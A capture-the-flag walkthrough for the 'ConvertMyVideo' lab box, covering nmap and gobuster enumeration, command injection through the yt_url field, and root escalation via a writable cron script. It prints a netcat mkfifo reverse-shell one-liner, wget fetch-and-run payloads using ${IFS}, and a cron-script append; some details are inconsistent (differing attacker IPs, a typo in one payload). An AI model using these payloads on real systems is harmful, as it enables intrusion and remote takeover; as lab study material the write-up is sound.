# ConvertMyVideo

> RedAiden

## Enumeration

### Nmap

Start a basic nmap scan

`nmap -sC -sV 10.10.204.129`
```
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 02:98:EB:98:E4:25 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can see port 80 open running Apache.

### gobuster

Run a gobuster scan to find hidden directories

`gobuster dir -u http://10.10.204.129:80 -w /usr/share/wordlists/dirb/big.txt`
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 401)
/images (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
/tmp (Status: 301)
```
- We can see an admin panel, but it asks for an unkown password.

## Exploitation
When you enter the website you can see the convert my video application. We can try and analyze the requests using burpsuite to look for command execution.

1. Open burpsuit and in the proxy tab, make sure intercept is on
2. In your browser make sure to have the setting to proxy your traffic through burp (127.0.0.1 8080)
3. Type anything into the field in the convert my video app and click convert
4. Burpsuite should intercept the request.
   - We can see that it has a `yt_url` field
   - If we replace the contents of the field with a command using back ticks we can see that it executes once we send it
   - This can be exploited by sendind a Netcat reverse shell via a wget command from a local http server
5. Create a NC reverse shell in your machine:
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f' > nc_shell
```
6. Start a python http server in the same directory as your file:
```bash
python -m SimpleHTTPServer
```
7. In burpsuite, change the field into a wget command
```
yt_url=`wget${IFS}10.10.0.1:8000/nc_shell`
```
8. Start a nc listener on your machine: `nc -lvnp 1234`
9. Run the script in the target machine by changing again the content of the yt_url field
```
yt_url=`bash${IFS}nc_shel;l`
```
10. The listener should get the reverse shell

## Privilege Escalation

1. Once in the reverse shell, do `ls` to find an `/admin` folder
2. Inside the admin folder you'll find the user flag `cat admin/flag.txt`
3. There's another folder called `/tmp`. If we see its contents we find a clean.sh script
4. If we upload an automated scan script like `LinEnum.sh` or `linpeas.sh` we can find that the `clean.sh` script foudn in the tmp folder runs as a scheduled task as root. We can abuse this to get the root flag
5. Append the code to be executed to the script
```
echo 'cat /root/root.txt > root_flag' >> clean.sh
```
6. Wait a few seconds for the script to be executed automatically. Then run `ls` to check if the file `root_flag` generated with our root flag.